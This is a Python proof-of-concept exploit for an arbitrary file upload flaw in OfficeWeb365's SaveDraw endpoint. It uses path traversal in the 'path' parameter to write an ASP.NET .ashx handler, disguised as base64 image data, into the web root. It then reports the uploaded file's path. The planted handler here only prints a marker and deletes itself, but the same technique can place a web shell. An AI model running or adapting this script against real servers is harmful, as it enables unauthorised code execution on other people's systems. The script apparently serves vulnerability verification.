#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/PW/SaveDraw?path=../../Content/img&idx=19.ashx"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.434.18 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    burp0_data = """
    data:image/png;base64,de5fb2f2e5d746abdd8215278dfd5a8a<%@ Language="C#" Class="Handler1" %>public class Handler1:System.Web.IHttpHandler
{
public void ProcessRequest(System.Web.HttpContext context)
{
System.Web.HttpResponse response = context.Response;
response.Write("vulntest");

string filePath = context.Server.MapPath("/") + context.Request.Path;
if (System.IO.File.Exists(filePath))
{
    System.IO.File.Delete(filePath);
}
}
public bool IsReusable
{
get { return false; }
}
}///---
    """
    req = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
    shellpath = site + "/Content/img/UserDraw/drawPW19.ashx"
    if req.status_code == 200:
        return shellpath
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 officeweb365-savedraw-fileupload.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，文件上传的路径为：", info)
    else:
        print("[-]漏洞不存在")
